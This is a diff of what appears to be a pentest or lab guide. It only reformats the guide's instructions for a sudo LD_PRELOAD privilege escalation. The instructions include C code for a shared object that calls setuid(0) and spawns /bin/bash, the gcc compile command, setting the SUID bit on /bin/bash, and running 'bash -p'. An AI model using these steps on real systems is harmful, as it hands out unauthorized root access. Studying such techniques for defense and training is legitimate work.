@@ -56,7 +56,7 @@ Write a simple C code compiled as a share object (.so extension) file
 Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
 The C code will simply spawn a root shell and can be written as follows;
 #include <stdio.h>
-
+```
 #include <sys/types.h>
 
 #include <stdlib.h>
@@ -72,11 +72,11 @@ setuid(0);
 system("/bin/bash");
 
 }
-
+```
 We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
 
-gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
-set suid bit on /bin/bash (chmod +s /bin/bash)
+set suid bit on /bin/bash `chmod +s /bin/bash`
 
-run bash -p
+run `bash -p`
